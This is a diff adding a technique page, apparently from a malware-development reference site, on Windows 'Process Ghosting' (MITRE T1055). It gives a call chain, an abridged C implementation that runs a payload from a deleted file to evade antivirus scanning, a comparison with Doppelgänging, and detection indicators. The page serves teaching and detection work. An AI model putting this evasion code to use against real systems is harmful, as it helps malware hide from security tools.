@@ -1,0 +1,176 @@
+---
+title: Process Ghosting
+mitre: T1055
+category: injection
+group: Image Replacement
+summary: Write a payload to a pending-delete file so Windows maps it into memory before the file is gone.
+platform: [Windows]
+tags: ['C / C++', 'NTFS', 'x64']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: NtCreateFile with DELETE_ON_CLOSE / SetDeleteDispositionFile
+    desc: Create a temp file marked for deletion so no AV can open it for scanning.
+    dll: ntdll
+  - call: WriteFile (payload PE)
+    desc: Write the malicious image into the delete-pending file while we hold the only handle.
+    dll: kernel32
+  - call: NtCreateSection(SEC_IMAGE) on the file handle
+    desc: Create an image section from the file before closing. Windows maps it into memory at this point.
+    dll: ntdll
+  - call: CloseHandle (file handle)
+    desc: The file is deleted from the filesystem — it no longer exists on disk.
+    dll: kernel32
+  - call: NtCreateProcessEx with the section handle
+    desc: Spawn a new process backed by the now-deleted section — no file on disk to scan.
+    dll: ntdll
+  - call: set up PEB, stack, and initial thread
+    desc: Manually construct process parameters and create the first thread to start execution.
+    dll: ntdll
+detections:
+  - src: MEMORY SCAN
+    text: A running process whose image file path does not resolve to an existing file on disk.
+  - src: ETW-TI
+    text: NtCreateProcessEx called with a section handle rather than a file handle (atypical path).
+  - src: SYSMON EID 1
+    text: Process creation event where the image cannot be hashed because the file no longer exists.
+  - src: BEHAVIOURAL
+    text: NtCreateFile with FILE_DELETE_ON_CLOSE followed immediately by NtCreateSection(SEC_IMAGE) on the same handle.
+related:
+  - mitre: T1055.013
+    title: Process Doppelgänging
+    desc: Predecessor technique using NTFS transactions instead of delete-pending files.
+    href: /techniques/injection/process-doppelganging
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Simpler alternative; image file remains on disk and is scannable.
+    href: /techniques/injection/process-hollowing
+labKit:
+  - label: ghosting.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Process Ghosting exploits a race condition in how Windows handles file deletion and section
+creation. When a file is marked delete-pending (either via `FILE_DELETE_ON_CLOSE` or
+`SetFileInformationByHandle(FileDispositionInfo)`), no other process can open it — including
+AV scanners. But as long as we hold the original handle, we can still create an image section
+from it. Once we close the handle, the file disappears from disk. The section, and any process
+backed by it, survives.
+
+The result is a running process whose backing image does not exist on disk — making file-based
+scanning impossible and file-path tracking useless.
+
+<Callout type="note">
+  Process Ghosting was publicly documented by Elastic Security in 2021. Windows 11 and newer
+  Windows 10 builds have partially mitigated it by blocking `NtCreateSection(SEC_IMAGE)` on
+  delete-pending files. The technique still works on older builds and some server SKUs.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="ghosting.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// Abridged — error handling and full process setup omitted
+#include <windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI *NtCreateProcessEx_t)(
+    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE,
+    ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
+
+void ghost_process(const wchar_t *temp_path, const BYTE *payload, size_t len) {
+    // 1. Create a temp file, immediately mark it delete-on-close
+    HANDLE hFile = CreateFileW(temp_path, GENERIC_WRITE | DELETE,
+                               0, NULL, CREATE_ALWAYS,
+                               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
+                               NULL);
+
+    // 2. Write the payload PE into the delete-pending file
+    DWORD written;
+    WriteFile(hFile, payload, (DWORD)len, &written, NULL);
+
+    // 3. Create an image section from the file while we still hold the handle
+    HANDLE hSection = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof oa };
+    NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oa,
+                    NULL,               // MaximumSize — use file size
+                    PAGE_READONLY,
+                    SEC_IMAGE,          // map as PE image
+                    hFile);
+
+    // 4. Close the file handle — file is now deleted from NTFS
+    CloseHandle(hFile);
+    // At this point: no file on disk, but hSection is valid
+
+    // 5. Create a new process backed by the orphaned section
+    NtCreateProcessEx_t NtCPE = (NtCreateProcessEx_t)
+        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
+
+    HANDLE hProcess = NULL;
+    NtCPE(&hProcess, PROCESS_ALL_ACCESS, &oa,
+          GetCurrentProcess(),  // parent
+          PS_INHERIT_HANDLES,
+          hSection,             // the ghost section
+          NULL, NULL, FALSE);
+
+    // 6. Build PEB, RTL_USER_PROCESS_PARAMETERS, create first thread
+    // ... full process parameter setup and NtCreateThreadEx call omitted ...
+
+    CloseHandle(hSection);
+    CloseHandle(hProcess);
+}`}
+/>
+
+## Comparison with Doppelgänging
+
+| Property | Doppelgänging | Ghosting |
+|---|---|---|
+| Mechanism | NTFS transaction roll-back | Delete-on-close race |
+| File visible during write | Yes (inside transaction) | No (delete-pending blocks opens) |
+| Works on Win 11 (patched) | Mostly patched | Partially patched |
+| Complexity | High (TxF API) | Medium |
+| Section type | SEC_IMAGE from transaction | SEC_IMAGE from pending-delete |
+| Backing file after process start | Never existed | Deleted immediately |
+
+Both techniques aim to produce a process with no scannable on-disk backing file; they differ
+in how they achieve the write-then-disappear sequence.
+
+## What survives after the file is deleted
+
+The section object holds a reference-counted mapping of the original file's content. Deleting
+the file removes the directory entry but does not free the section. The process backed by that
+section continues running, and the section's pages remain valid until the process exits and the
+last reference to the section is released.
+
+Memory forensics tools like Volatility can still scan the in-memory pages — the file is gone
+but the content is not.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The clearest indicator is a running process whose `QueryFullProcessImageName` (or the
+`ImageFileName` field in `EPROCESS`) returns a path that no longer exists. This is detectable
+from outside the process and survives all in-process tampering.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
